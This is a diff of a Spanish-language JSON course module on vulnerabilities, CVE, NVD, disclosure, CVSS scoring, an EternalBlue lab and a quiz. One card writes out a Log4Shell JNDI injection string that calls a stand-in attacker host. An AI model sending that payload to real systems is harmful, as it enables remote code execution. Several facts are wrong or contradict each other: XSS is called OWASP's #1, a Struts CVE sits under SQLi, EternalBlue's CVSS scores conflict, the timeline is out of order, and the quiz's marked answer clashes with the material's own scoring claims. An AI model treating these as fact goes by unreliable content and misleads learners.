-              "Attack Vector (AV:N): Network - explotable via web browser",
-              "Attack Complexity (AC:L): Low - solo requiere victim visite URL",
-              "Privileges Required (PR:N): None - atacante no necesita cuenta",
-              "User Interaction (UI:R): Required - víctima debe visitar página/click link",
-              "Scope (S:C): Changed - XSS afecta otro dominio/contexto",
-              "Confidentiality (C:L): Low - puede robar cookies/session tokens",
-              "Integrity (I:L): Low - puede modificar contenido en browser de víctima",
-              "Availability (A:N): None - no afecta disponibilidad del servicio",
-              "CVSS Score: ~6.1 (MEDIUM)",
-              "Justificación: Peligroso pero requiere interacción de usuario"
-            ],
-            "bonus_fact": "XSS es la vulnerabilidad #1 en OWASP Top 10 web. Aunque score CVSS es 'solo' Medium, puede ser devastadora si roba credenciales de admin o instala keylogger en browser."
-          }
-        },
-        {
-          "id": "scenario_2",
-          "task": "Scenario 2: SQL Injection en API Backend",
-          "subtitle": "SQLi permite dump de toda la database",
-          "icon": "storage",
-          "unlock_content": {
-            "title": "Cálculo CVSS para SQLi",
-            "points": [
-              "Attack Vector (AV:N): Network - API accesible remotamente",
-              "Attack Complexity (AC:L): Low - SQLi es bien entendida, herramientas automatizadas",
-              "Privileges Required (PR:N): None - endpoint público sin autenticación",
-              "User Interaction (UI:N): None - completamente automatizable",
-              "Scope (S:U): Unchanged - afecta solo la database backend",
-              "Confidentiality (C:H): High - dump completo de passwords, PII, datos sensibles",
-              "Integrity (I:H): High - puede modificar/borrar datos con UPDATE/DELETE",
-              "Availability (A:H): High - puede hacer DROP TABLE, denegar servicio",
-              "CVSS Score: ~9.8 (CRITICAL)",
-              "Justificación: RCE-equivalent en database, impacto máximo, fácil explotación"
-            ],
-            "bonus_fact": "SQLi en Equifax (CVE-2017-5638) era en realidad en Apache Struts, no SQL directo, pero permitió acceso a database. Resultó en breach de 147M personas. CVSS: 9.8. Patch disponible por 2 meses, ignorado."
-          }
-        },
-        {
-          "id": "scenario_3",
-          "task": "Scenario 3: Local Privilege Escalation",
-          "subtitle": "User regular puede elevar a root/SYSTEM",
-          "icon": "arrow_upward",
-          "unlock_content": {
-            "title": "Cálculo CVSS para LPE",
-            "points": [
-              "Attack Vector (AV:L): Local - requiere acceso local al sistema",
-              "Attack Complexity (AC:L): Low - exploit confiable y público",
-              "Privileges Required (PR:L): Low - requiere cuenta de usuario normal",
-              "User Interaction (UI:N): None - solo ejecutar exploit",
-              "Scope (S:U): Unchanged - afecta solo el sistema local",
-              "Confidentiality (C:H): High - acceso a todos los archivos como root",
-              "Integrity (I:H): High - puede modificar sistema operativo",
-              "Availability (A:H): High - puede crashear o apagar sistema",
-              "CVSS Score: ~7.8 (HIGH)",
-              "Justificación: Severo pero requiere acceso inicial. Común en post-exploitation"
-            ],
-            "bonus_fact": "LPE es típicamente el segundo paso después de RCE. Atacante gana acceso como user limitado (via web app), luego usa LPE para root. DirtyPipe (CVE-2022-0847) en Linux fue LPE con CVSS 7.8."
-          }
-        },
-        {
-          "id": "scenario_4",
-          "task": "Scenario 4: Information Disclosure",
-          "subtitle": "API leak de emails de usuarios sin autenticación",
-          "icon": "info",
-          "unlock_content": {
-            "title": "Cálculo CVSS para Info Disclosure",
-            "points": [
-              "Attack Vector (AV:N): Network - API accesible remotamente",
-              "Attack Complexity (AC:L): Low - simple HTTP GET request",
-              "Privileges Required (PR:N): None - endpoint sin autenticación",
-              "User Interaction (UI:N): None - automatizable con script",
-              "Scope (S:U): Unchanged - solo afecta datos en la API",
-              "Confidentiality (C:H): High - expone PII (emails) de todos los usuarios",
-              "Integrity (I:N): None - solo lectura, no puede modificar",
-              "Availability (A:N): None - servicio sigue funcionando",
-              "CVSS Score: ~7.5 (HIGH)",
-              "Justificación: Info sensible expuesta sin protección, pero solo lectura"
-            ],
-            "bonus_fact": "Facebook API bug en 2019 (no fue CVE formal) expuso 540M records de usuarios en servidor AWS público. Aunque 'solo' info disclosure, violaba GDPR masivamente. Multa potencial de $1.6B."
-          }
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 7,
-    "type": "memory_cards",
-    "title": "Ciclo de Vida de Vulnerabilidades",
-    "duration": 180,
-    "content": {
-      "description": "Desde nacimiento hasta muerte de una vulnerabilidad",
-      "cards": [
-        {
-          "id": "1",
-          "front": {
-            "icon": "new_releases",
-            "term": "Vulnerability Birth",
-            "color": "#F57C00"
+          {
+            "id": "nvd",
+            "task": "NVD: National Vulnerability Database",
+            "subtitle": "Base de datos pública de NIST",
+            "icon": "storage",
+            "unlock_content": {
+              "title": "El Repositorio Definitivo",
+              "points": [
+                "NVD: Base de datos del gobierno de EE.UU. mantenida por NIST",
+                "URL: nvd.nist.gov",
+                "Contenido: Todos los CVEs + análisis adicional de NIST",
+                "Información: CVSS scores, CPE, CWE, referencias, patches",
+                "Actualización: Diaria, automatizada vía feeds XML/JSON",
+                "APIs disponibles para integración en herramientas de scanning",
+                "Búsqueda: Por CVE, vendor, producto, severidad, fecha",
+                "Gratis y público: cualquiera puede consultar"
+              ],
+              "bonus_fact": "NVD procesa ~50 CVEs por DÍA. En diciembre 2021 (Log4Shell) procesaron 200+ CVEs relacionados en una semana. El equipo trabajó 24/7 para mantener actualizada la base de datos."
+            }
           },
-          "back": {
-            "definition": "Vulnerabilidad nace cuando código defectuoso es escrito y deployado. Existe desde el momento de commit pero es desconocida. Puede permanecer latente por años antes de discovery. Legacy code puede tener vulns décadas antiguas.",
-            "example": "Log4j feature que causó Log4Shell fue agregada en 2013. Permaneció sin descubrir por 8 AÑOS hasta 2021. Heartbleed existió en OpenSSL por 2 años antes de discovery en 2014.",
-            "color": "#FFB74D"
+          {
+            "id": "disclosure",
+            "task": "Responsible Disclosure",
+            "subtitle": "Cómo se reportan vulnerabilidades éticamente",
+            "icon": "shield",
+            "unlock_content": {
+              "title": "El Proceso Ético",
+              "points": [
+                "1. Researcher descubre vulnerabilidad",
+                "2. Reporta PRIVADAMENTE al vendor (no publicar aún)",
+                "3. Vendor confirma y desarrolla patch (típicamente 90 días)",
+                "4. Disclosure coordinado: vendor libera patch + researcher publica detalles",
+                "5. Se asigna CVE ID",
+                "Bug bounties incentivan responsible disclosure con recompensas monetarias",
+                "Full disclosure: Publicar inmediatamente (controversial, presiona a vendors)"
+              ],
+              "bonus_fact": "Google Project Zero da 90 días a vendors antes de full disclosure. Si no hay patch en 90 días, publican anyway. Política controversial pero efectiva: vendors priorizan porque saben que clock está corriendo."
+            }
+          },
+          {
+            "id": "lifecycle",
+            "task": "Ciclo de Vida de una Vulnerabilidad",
+            "subtitle": "De descubrimiento a remediación",
+            "icon": "autorenew",
+            "unlock_content": {
+              "title": "Las 6 Etapas",
+              "points": [
+                "1. DISCOVERY: Researcher/atacante encuentra vuln",
+                "2. DISCLOSURE: Reportada a vendor (privado) o pública",
+                "3. PATCH DEVELOPMENT: Vendor crea fix (días a meses)",
+                "4. PATCH RELEASE: Update disponible públicamente",
+                "5. DEPLOYMENT: Organizaciones aplican patch (0-∞ días)",
+                "6. EXPLOITATION: Atacantes explotan durante ventana entre disclosure y deployment",
+                "Window of Exposure: Tiempo entre disclosure pública y patch aplicado",
+                "Race condition: Organizaciones vs Atacantes"
+              ],
+              "bonus_fact": "Tiempo promedio de patch development: 30 días para critical. Tiempo promedio de deployment: 100+ días. Window of Exposure típico: 70+ días. Por eso los zero-days son tan valiosos: window es infinita hasta discovery."
+            }
           }
-        },
-        {
-          "id": "2",
-          "front": {
+        ]
+      }
+    },
+    {
+      "screen_id": 4,
+      "type": "memory_cards",
+      "title": "CVSS: Common Vulnerability Scoring System",
+      "duration": 240,
+      "content": {
+        "description": "Sistema estándar para medir severidad de vulnerabilidades (0.0 - 10.0)",
+        "cards": [
+          {
+            "id": "1",
+            "front": {
+              "icon": "speed",
+              "term": "CVSS Score",
+              "color": "#D32F2F"
+            },
+            "back": {
+              "definition": "Puntuación numérica de 0.0 (mínimo) a 10.0 (máximo) que representa la severidad de una vulnerabilidad. Calculada usando métricas estandarizadas. Ayuda a priorizar remediación. Versión actual: CVSS v3.1 (2019), v4.0 disponible desde 2023.",
+              "example": "Log4Shell: 10.0 (crítico). EternalBlue: 9.3 (crítico). Heartbleed: 7.5 (alto). 10.0 es raro: requiere RCE sin autenticación, fácil explotación, impacto total. Solo ~1% de CVEs son 10.0.",
+              "color": "#EF5350"
+            }
+          },
+          {
+            "id": "2",
+            "front": {
+              "icon": "network_check",
+              "term": "Attack Vector (AV)",
+              "color": "#FF6F00"
+            },
+            "back": {
+              "definition": "Cómo puede ser explotada la vulnerabilidad. Network (N): Remotamente vía internet. Adjacent (A): Misma LAN. Local (L): Acceso local requerido. Physical (P): Acceso físico. Network es más severo porque atacante puede estar en cualquier lugar.",
+              "example": "Log4Shell: Network (N) - explotable desde internet. EternalBlue: Network (N) - via SMB puerto 445. USB malware: Physical (P) - requiere insertar USB. Privilege escalation: Local (L) - necesitas ya estar dentro.",
+              "color": "#FFB74D"
+            }
+          },
+          {
+            "id": "3",
+            "front": {
+              "icon": "lock_open",
+              "term": "Attack Complexity (AC)",
+              "color": "#7B1FA2"
+            },
+            "back": {
+              "definition": "Dificultad técnica para explotar. Low (L): Fácil, reproducible, no requiere condiciones especiales. High (H): Difícil, requiere timing perfecto, race conditions, configuración específica. Low es más severo porque cualquiera puede explotar.",
+              "example": "Log4Shell: Low (L) - solo enviar ${jndi:ldap://evil.com/a}. Súper simple. Heartbleed: Low (L) - script de 10 líneas. Race condition en kernel: High (H) - timing perfecto, falla frecuentemente.",
+              "color": "#BA68C8"
+            }
+          },
+          {
+            "id": "4",
+            "front": {
+              "icon": "how_to_reg",
+              "term": "Privileges Required (PR)",
+              "color": "#0288D1"
+            },
+            "back": {
+              "definition": "Nivel de privilegios necesario antes de explotar. None (N): No requiere autenticación. Low (L): Usuario normal. High (H): Admin/privileged. None es más severo porque atacante externo puede explotar sin credentials.",
+              "example": "Log4Shell: None (N) - sin autenticación necesaria. SQLi en login form: None (N). Local privilege escalation: Low (L) - necesitas cuenta de usuario primero. Kernel exploit local: Low (L).",
+              "color": "#42A5F5"
+            }
+          },
+          {
+            "id": "5",
+            "front": {
+              "icon": "person",
+              "term": "User Interaction (UI)",
+              "color": "#388E3C"
+            },
+            "back": {
+              "definition": "¿Requiere acción del usuario? None (N): Completamente automatizable, no requiere víctima activa. Required (R): Usuario debe hacer algo (click link, abrir archivo). None es más severo porque worms pueden propagarse sin humanos.",
+              "example": "Log4Shell: None (N) - automático. EternalBlue: None (N) - worm auto-propagable. Phishing con macro maliciosa: Required (R) - víctima debe abrir documento y habilitar macros. XSS: Required (R) - víctima debe visitar URL.",
+              "color": "#66BB6A"
+            }
+          },
+          {
+            "id": "6",
+            "front": {
+              "icon": "crisis_alert",
+              "term": "Impact: CIA",
+              "color": "#C62828"
+            },
+            "back": {
+              "definition": "Impacto en Confidencialidad, Integridad, Disponibilidad. Cada uno: None (N), Low (L), High (H). High significa compromiso total del componente. Log4Shell es H/H/H: lee todo, modifica todo, puede denegar servicio. Peor caso posible.",
+              "example": "RCE típico: H/H/H (control total). Information disclosure: H/N/N (solo leak). DoS: N/N/H (solo caída). Integrity violation: N/H/N (modificación sin leak). Scoring considera los 3 juntos para total.",
+              "color": "#E53935"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "screen_id": 5,
+      "type": "progress_checklist",
+      "title": "Lab: Analiza CVE-2017-0144 (EternalBlue)",
+      "duration": 360,
+      "content": {
+        "title": "Análisis Forense de la Vulnerabilidad de WannaCry",
+        "items": [
+          {
+            "id": "nvd_lookup",
+            "task": "Consultar CVE en NVD",
+            "subtitle": "nvd.nist.gov/vuln/detail/CVE-2017-0144",
             "icon": "search",
-            "term": "Discovery",
-            "color": "#7B1FA2"
+            "unlock_content": {
+              "title": "Información Básica del CVE",
+              "points": [
+                "CVE ID: CVE-2017-0144",
+                "Published: 2017-03-16",
+                "CVSS v3: 8.1 (HIGH) - originalmente, luego recalculado a 9.3",
+                "CVSS v2: 9.3 (HIGH)",
+                "Tipo: CWE-119 (Buffer Overflow)",
+                "Affected: Microsoft Windows SMBv1 server (todas las versiones de Windows)",
+                "Vector String: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "Descripción: Buffer overflow permite remote code execution via paquetes SMB craftados"
+              ],
+              "bonus_fact": "Microsoft asignó MS17-010 (bulletin) a este CVE. Un solo bulletin puede cubrir múltiples CVEs. MS17-010 parcheó 9 vulnerabilidades relacionadas en SMB, pero CVE-2017-0144 fue la que WannaCry explotó."
+            }
           },
-          "back": {
-            "definition": "Alguien encuentra la vulnerabilidad. Puede ser security researcher (white hat), vendor interno, o atacante (black hat). Discovery puede ser accidental, via fuzzing, code review, o análisis de crashes. Momento crítico: ¿reportar o explotar?",
-            "example": "Chen Zhaojun (Alibaba) descubrió Log4Shell via análisis de código. Marcus Hutchins descubrió WannaCry kill switch via reverse engineering. NSA descubrió EternalBlue via ???? (clasificado).",
-            "color": "#BA68C8"
-          }
-        },
-        {
-          "id": "3",
-          "front": {
-            "icon": "schedule",
-            "term": "Disclosure",
-            "color": "#D32F2F"
+          {
+            "id": "cvss_breakdown",
+            "task": "Desglosar CVSS Score",
+            "subtitle": "¿Por qué 9.3 de severidad?",
+            "icon": "analytics",
+            "unlock_content": {
+              "title": "Análisis de Métricas CVSS",
+              "points": [
+                "Attack Vector (AV:N): Network - explotable remotamente via internet",
+                "Attack Complexity (AC:L): Low - fácil de explotar, código público disponible",
+                "Privileges Required (PR:N): None - sin autenticación necesaria",
+                "User Interaction (UI:N): None - completamente automatizable, worm",
+                "Scope (S:U): Unchanged - afecta solo el componente vulnerable",
+                "Confidentiality (C:H): High - acceso completo a datos",
+                "Integrity (I:H): High - control total del sistema",
+                "Availability (A:H): High - puede denegar servicio",
+                "RESULTADO: 9.3 = Crítico, RCE sin autenticación, impacto máximo"
+              ],
+              "bonus_fact": "Un 9.3 es casi el máximo posible. Solo le falta ser 10.0, lo cual requeriría Scope Changed (S:C) o Attack Complexity aún más baja. EternalBlue es prácticamente el peor escenario posible para una vulnerabilidad."
+            }
           },
-          "back": {
-            "definition": "Vulnerabilidad se hace conocida. Responsible disclosure: reportar privadamente a vendor, dar tiempo para patch. Full disclosure: publicar inmediatamente. Coordinated disclosure: trabajar con vendor en timeline. Zero-day: si atacantes descubren primero, no hay disclosure.",
-            "example": "Log4Shell: Alibaba reportó a Apache privadamente el 24/11, disclosure público 9/12 con patch. Google Project Zero: 90 días deadline, luego full disclosure. Eternal Blue: NSA nunca disclosure, fue filtrado.",
-            "color": "#EF5350"
-          }
-        },
-        {
-          "id": "4",
-          "front": {
-            "icon": "build",
-            "term": "Patch Development",
-            "color": "#388E3C"
+          {
+            "id": "exploitation",
+            "task": "Entender la Explotación",
+            "subtitle": "Cómo funciona EternalBlue técnicamente",
+            "icon": "code",
+            "unlock_content": {
+              "title": "Mecánica del Exploit",
+              "points": [
+                "Vulnerabilidad: Buffer overflow en srv.sys (SMB driver de Windows kernel)",
+                "Puerto: 445/TCP (SMB)",
+                "Trigger: Paquetes SMB especialmente craftados con size fields maliciosos",
+                "Efecto: Overflow de buffer en kernel space → control de EIP (instruction pointer)",
+                "Payload: Shellcode ejecutado con privilegios SYSTEM (máximo en Windows)",
+                "Seguimiento: DoublePulsar backdoor para persistencia y ejecución adicional",
+                "Detección: IDS rules para patrones específicos, pero bypass posible",
+                "Mitigación: Patch MS17-010 O deshabilitar SMBv1 completamente"
+              ],
+              "bonus_fact": "EternalBlue fue desarrollado por NSA's Tailored Access Operations (TAO) unit como herramienta de espionaje. Lo mantuvieron secreto por AÑOS hasta que Shadow Brokers lo filtró en abril 2017."
+            }
           },
-          "back": {
-            "definition": "Vendor desarrolla fix. Proceso: reproducir bug, encontrar root cause, codear fix, testing (no romper features), QA, liberación. Tiempo típico: 30 días para critical, 90 días para non-critical. Urgencia depende de severidad y si hay exploits public.",
-            "example": "Apache Log4j: Patch en 2 días (2.15.0) pero incompleto, requirió 2.16.0 y 2.17.0. Microsoft EternalBlue: Patch en timeline normal, no sabían que NSA tenía exploit. Vendors balancean velocidad vs calidad.",
-            "color": "#66BB6A"
-          }
-        },
-        {
-          "id": "5",
-          "front": {
-            "icon": "download",
-            "term": "Deployment",
-            "color": "#0288D1"
+          {
+            "id": "timeline",
+            "task": "Reconstruir Timeline",
+            "subtitle": "De descubrimiento a WannaCry",
+            "icon": "timeline",
+            "unlock_content": {
+              "title": "Línea de Tiempo Crítica",
+              "points": [
+                "Pre-2017: NSA descubre vulnerabilidad, desarrolla exploit, lo usa para espionaje",
+                "Abril 2017: Shadow Brokers filtra herramientas de NSA incluyendo EternalBlue",
+                "14 Marzo 2017: Microsoft libera patch MS17-010 (58 días ANTES de WannaCry)",
+                "12 Mayo 2017: WannaCry comienza propagación masiva usando EternalBlue",
+                "13 Mayo 2017: Marcus Hutchins registra kill switch domain, detiene propagación",
+                "27 Junio 2017: NotPetya usa EternalBlue, causa $10B en daños",
+                "2018-2024: EternalBlue SIGUE siendo explotado en sistemas sin parchear",
+                "Lección: 58 días de warning no fueron suficientes. Patch management salvó vidas."
+              ],
+              "bonus_fact": "Microsoft tomó decisión histórica de patchear Windows XP (oficialmente end-of-life desde 2014) debido a la severidad. Liberaron parches para XP, Windows 8, Server 2003 a pesar de no tener soporte."
+            }
           },
-          "back": {
-            "definition": "Organizaciones aplican patches. Realidad: LENTO. Requiere testing en staging, approval de change management, ventanas de mantenimiento, rollback plans. Enterprise promedio: 100+ días para patch completo. Cloud providers: horas. Legacy systems: nunca.",
-            "example": "WannaCry: Patch disponible 58 días antes del ataque. Muchos no parchearon. Equifax: Patch disponible 2 meses, no aplicaron, breach masivo. Razones: miedo a romper producción, falta de inventory, complejidad.",
-            "color": "#42A5F5"
+          {
+            "id": "impact_analysis",
+            "task": "Calcular Impacto Global",
+            "subtitle": "Daños causados por esta única vulnerabilidad",
+            "icon": "public",
+            "unlock_content": {
+              "title": "El Verdadero Costo de CVE-2017-0144",
+              "points": [
+                "WannaCry: 200,000+ sistemas, 150 países, $4B en daños",
+                "NotPetya: Maersk perdió $300M, FedEx $400M, total global $10B+",
+                "NHS UK: 19,000 citas canceladas, cirugías pospuestas",
+                "Infraestructura: Puerto de San Diego, sistema de tránsito de SF, múltiples gobiernos",
+                "Sistemas vulnerables: Aún en 2024, ~1M de sistemas exponen puerto 445 con SMBv1",
+                "Long tail: Botnets usan EternalBlue para propagación años después",
+                "Total estimado: >$15B en daños económicos globales por UN solo CVE",
+                "Prevención: Simple patch de 5MB hubiera prevenido TODO"
+              ],
+              "bonus_fact": "CVE-2017-0144 es probablemente la vulnerabilidad más costosa de la historia en términos de daños económicos. Superó incluso a Code Red y Slammer. Una lección de $15B sobre patch management."
+            }
           }
-        },
-        {
-          "id": "6",
-          "front": {
-            "icon": "gpp_maybe",
-            "term": "Exploitation Window",
-            "color": "#C62828"
+        ]
+      }
+    },
+    {
+      "screen_id": 6,
+      "type": "progress_checklist",
+      "title": "Calculadora CVSS: Evalúa Severidad",
+      "duration": 240,
+      "content": {
+        "title": "Practica Calculando CVSS para Diferentes Vulnerabilidades",
+        "items": [
+          {
+            "id": "scenario_1",
+            "task": "Scenario 1: XSS en Sitio Web Público",
+            "subtitle": "Cross-Site Scripting en formulario de comentarios",
+            "icon": "code",
+            "unlock_content": {
+              "title": "Cálculo CVSS para XSS",
+              "points": [
+                "Attack Vector (AV:N): Network - explotable via web browser",
+                "Attack Complexity (AC:L): Low - solo requiere victim visite URL",
+                "Privileges Required (PR:N): None - atacante no necesita cuenta",
+                "User Interaction (UI:R): Required - víctima debe visitar página/click link",
+                "Scope (S:C): Changed - XSS afecta otro dominio/contexto",
+                "Confidentiality (C:L): Low - puede robar cookies/session tokens",
+                "Integrity (I:L): Low - puede modificar contenido en browser de víctima",
+                "Availability (A:N): None - no afecta disponibilidad del servicio",
+                "CVSS Score: ~6.1 (MEDIUM)",
+                "Justificación: Peligroso pero requiere interacción de usuario"
+              ],
+              "bonus_fact": "XSS es la vulnerabilidad #1 en OWASP Top 10 web. Aunque score CVSS es 'solo' Medium, puede ser devastadora si roba credenciales de admin o instala keylogger en browser."
+            }
           },
-          "back": {
-            "definition": "Período entre disclosure público y deployment completo de patches. Ventana de oportunidad para atacantes. Race condition: defenders parcheando vs atacantes explotando. N-days son explotadas masivamente en esta ventana porque atacantes saben que muchos no han parcheado aún.",
-            "example": "Log4Shell: Exploits públicos en GitHub en HORAS. Escaneos masivos inmediatos. 72 horas de pánico global. EternalBlue: 58 días de window antes de WannaCry. Algunos sistemas SIGUEN sin parchear años después (window infinita).",
-            "color": "#E53935"
+          {
+            "id": "scenario_2",
+            "task": "Scenario 2: SQL Injection en API Backend",
+            "subtitle": "SQLi permite dump de toda la database",
+            "icon": "storage",
+            "unlock_content": {
+              "title": "Cálculo CVSS para SQLi",
+              "points": [
+                "Attack Vector (AV:N): Network - API accesible remotamente",
+                "Attack Complexity (AC:L): Low - SQLi es bien entendida, herramientas automatizadas",
+                "Privileges Required (PR:N): None - endpoint público sin autenticación",
+                "User Interaction (UI:N): None - completamente automatizable",
+                "Scope (S:U): Unchanged - afecta solo la database backend",
+                "Confidentiality (C:H): High - dump completo de passwords, PII, datos sensibles",
+                "Integrity (I:H): High - puede modificar/borrar datos con UPDATE/DELETE",
+                "Availability (A:H): High - puede hacer DROP TABLE, denegar servicio",
+                "CVSS Score: ~9.8 (CRITICAL)",
+                "Justificación: RCE-equivalent en database, impacto máximo, fácil explotación"
+              ],
+              "bonus_fact": "SQLi en Equifax (CVE-2017-5638) era en realidad en Apache Struts, no SQL directo, pero permitió acceso a database. Resultó en breach de 147M personas. CVSS: 9.8. Patch disponible por 2 meses, ignorado."
+            }
+          },
+          {
+            "id": "scenario_3",
+            "task": "Scenario 3: Local Privilege Escalation",
+            "subtitle": "User regular puede elevar a root/SYSTEM",
+            "icon": "arrow_upward",
+            "unlock_content": {
+              "title": "Cálculo CVSS para LPE",
+              "points": [
+                "Attack Vector (AV:L): Local - requiere acceso local al sistema",
+                "Attack Complexity (AC:L): Low - exploit confiable y público",
+                "Privileges Required (PR:L): Low - requiere cuenta de usuario normal",
+                "User Interaction (UI:N): None - solo ejecutar exploit",
+                "Scope (S:U): Unchanged - afecta solo el sistema local",
+                "Confidentiality (C:H): High - acceso a todos los archivos como root",
+                "Integrity (I:H): High - puede modificar sistema operativo",
+                "Availability (A:H): High - puede crashear o apagar sistema",
+                "CVSS Score: ~7.8 (HIGH)",
+                "Justificación: Severo pero requiere acceso inicial. Común en post-exploitation"
+              ],
+              "bonus_fact": "LPE es típicamente el segundo paso después de RCE. Atacante gana acceso como user limitado (via web app), luego usa LPE para root. DirtyPipe (CVE-2022-0847) en Linux fue LPE con CVSS 7.8."
+            }
+          },
+          {
+            "id": "scenario_4",
+            "task": "Scenario 4: Information Disclosure",
+            "subtitle": "API leak de emails de usuarios sin autenticación",
+            "icon": "info",
+            "unlock_content": {
+              "title": "Cálculo CVSS para Info Disclosure",
+              "points": [
+                "Attack Vector (AV:N): Network - API accesible remotamente",
+                "Attack Complexity (AC:L): Low - simple HTTP GET request",
+                "Privileges Required (PR:N): None - endpoint sin autenticación",
+                "User Interaction (UI:N): None - automatizable con script",
+                "Scope (S:U): Unchanged - solo afecta datos en la API",
+                "Confidentiality (C:H): High - expone PII (emails) de todos los usuarios",
+                "Integrity (I:N): None - solo lectura, no puede modificar",
+                "Availability (A:N): None - servicio sigue funcionando",
+                "CVSS Score: ~7.5 (HIGH)",
+                "Justificación: Info sensible expuesta sin protección, pero solo lectura"
+              ],
+              "bonus_fact": "Facebook API bug en 2019 (no fue CVE formal) expuso 540M records de usuarios en servidor AWS público. Aunque 'solo' info disclosure, violaba GDPR masivamente. Multa potencial de $1.6B."
+            }
           }
-        }
-      ]
+        ]
+      }
+    },
+    {
+      "screen_id": 7,
+      "type": "memory_cards",
+      "title": "Ciclo de Vida de Vulnerabilidades",
+      "duration": 180,
+      "content": {
+        "description": "Desde nacimiento hasta muerte de una vulnerabilidad",
+        "cards": [
+          {
+            "id": "1",
+            "front": {
+              "icon": "new_releases",
+              "term": "Vulnerability Birth",
+              "color": "#F57C00"
+            },
+            "back": {
+              "definition": "Vulnerabilidad nace cuando código defectuoso es escrito y deployado. Existe desde el momento de commit pero es desconocida. Puede permanecer latente por años antes de discovery. Legacy code puede tener vulns décadas antiguas.",
+              "example": "Log4j feature que causó Log4Shell fue agregada en 2013. Permaneció sin descubrir por 8 AÑOS hasta 2021. Heartbleed existió en OpenSSL por 2 años antes de discovery en 2014.",
+              "color": "#FFB74D"
+            }
+          },
+          {
+            "id": "2",
+            "front": {
+              "icon": "search",
+              "term": "Discovery",
+              "color": "#7B1FA2"
+            },
+            "back": {
+              "definition": "Alguien encuentra la vulnerabilidad. Puede ser security researcher (white hat), vendor interno, o atacante (black hat). Discovery puede ser accidental, via fuzzing, code review, o análisis de crashes. Momento crítico: ¿reportar o explotar?",
+              "example": "Chen Zhaojun (Alibaba) descubrió Log4Shell via análisis de código. Marcus Hutchins descubrió WannaCry kill switch via reverse engineering. NSA descubrió EternalBlue via ???? (clasificado).",
+              "color": "#BA68C8"
+            }
+          },
+          {
+            "id": "3",
+            "front": {
+              "icon": "schedule",
+              "term": "Disclosure",
+              "color": "#D32F2F"
+            },
+            "back": {
+              "definition": "Vulnerabilidad se hace conocida. Responsible disclosure: reportar privadamente a vendor, dar tiempo para patch. Full disclosure: publicar inmediatamente. Coordinated disclosure: trabajar con vendor en timeline. Zero-day: si atacantes descubren primero, no hay disclosure.",
+              "example": "Log4Shell: Alibaba reportó a Apache privadamente el 24/11, disclosure público 9/12 con patch. Google Project Zero: 90 días deadline, luego full disclosure. Eternal Blue: NSA nunca disclosure, fue filtrado.",
+              "color": "#EF5350"
+            }
+          },
+          {
+            "id": "4",
+            "front": {
+              "icon": "build",
+              "term": "Patch Development",
+              "color": "#388E3C"
+            },
+            "back": {
+              "definition": "Vendor desarrolla fix. Proceso: reproducir bug, encontrar root cause, codear fix, testing (no romper features), QA, liberación. Tiempo típico: 30 días para critical, 90 días para non-critical. Urgencia depende de severidad y si hay exploits public.",
+              "example": "Apache Log4j: Patch en 2 días (2.15.0) pero incompleto, requirió 2.16.0 y 2.17.0. Microsoft EternalBlue: Patch en timeline normal, no sabían que NSA tenía exploit. Vendors balancean velocidad vs calidad.",
+              "color": "#66BB6A"
+            }
+          },
+          {
+            "id": "5",
+            "front": {
+              "icon": "download",
+              "term": "Deployment",
+              "color": "#0288D1"
+            },
+            "back": {
+              "definition": "Organizaciones aplican patches. Realidad: LENTO. Requiere testing en staging, approval de change management, ventanas de mantenimiento, rollback plans. Enterprise promedio: 100+ días para patch completo. Cloud providers: horas. Legacy systems: nunca.",
+              "example": "WannaCry: Patch disponible 58 días antes del ataque. Muchos no parchearon. Equifax: Patch disponible 2 meses, no aplicaron, breach masivo. Razones: miedo a romper producción, falta de inventory, complejidad.",
+              "color": "#42A5F5"
+            }
+          },
+          {
+            "id": "6",
+            "front": {
+              "icon": "gpp_maybe",
+              "term": "Exploitation Window",
+              "color": "#C62828"
+            },
+            "back": {
+              "definition": "Período entre disclosure público y deployment completo de patches. Ventana de oportunidad para atacantes. Race condition: defenders parcheando vs atacantes explotando. N-days son explotadas masivamente en esta ventana porque atacantes saben que muchos no han parcheado aún.",
+              "example": "Log4Shell: Exploits públicos en GitHub en HORAS. Escaneos masivos inmediatos. 72 horas de pánico global. EternalBlue: 58 días de window antes de WannaCry. Algunos sistemas SIGUEN sin parchear años después (window infinita).",
+              "color": "#E53935"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "screen_id": 8,
+      "type": "quiz",
+      "title": "Evaluación - Vulnerabilidades y CVE",
+      "duration": 120,
+      "content": {
+        "question": "Una vulnerabilidad tiene CVSS score de 10.0. ¿Cuál de las siguientes características es OBLIGATORIA para alcanzar score perfecto de 10.0?",
+        "options": [
+          {
+            "id": "a",
+            "text": "Debe ser un zero-day nunca visto antes",
+            "is_correct": false,
+            "feedback": "Incorrecto. CVSS NO considera si es zero-day o conocida. Solo evalúa características técnicas de explotabilidad e impacto. Una vulnerabilidad de 10 años puede tener 10.0 si las métricas lo justifican."
+          },
+          {
+            "id": "b",
+            "text": "Attack Vector = Network, Privileges Required = None, User Interaction = None, e Impacto CIA = High/High/High",
+            "is_correct": true,
+            "feedback": "¡CORRECTO! Para 10.0 se requiere: explotación remota sin autenticación (AV:N, PR:N), sin interacción de usuario (UI:N), complejidad baja (AC:L), e impacto total en CIA (C:H/I:H/A:H). Log4Shell cumplió TODO esto. Es el peor escenario posible."
+          },
+          {
+            "id": "c",
+            "text": "Debe afectar a millones de sistemas globalmente",
+            "is_correct": false,
+            "feedback": "Incorrecto. CVSS NO considera cuántos sistemas están afectados. Solo evalúa la vulnerabilidad en sí. Una vuln en software usado por 1 persona puede tener 10.0 si técnicamente es devastadora. El alcance es factor aparte."
+          },
+          {
+            "id": "d",
+            "text": "Debe haber causado daños financieros masivos",
+            "is_correct": false,
+            "feedback": "Incorrecto. CVSS es scoring TÉCNICO, no económico. No considera dinero perdido, reputación, o impacto de negocio. Esos son factores para risk assessment, no CVSS. Una vuln nunca explotada puede tener 10.0."
+          }
+        ]
+      }
     }
-  },
-  {
-    "screen_id": 8,
-    "type": "quiz",
-    "title": "Evaluación - Vulnerabilidades y CVE",
-    "duration": 120,
-    "content": {
-      "question": "Una vulnerabilidad tiene CVSS score de 10.0. ¿Cuál de las siguientes características es OBLIGATORIA para alcanzar score perfecto de 10.0?",
-      "options": [
-        {
-          "id": "a",
-          "text": "Debe ser un zero-day nunca visto antes",
-          "is_correct": false,
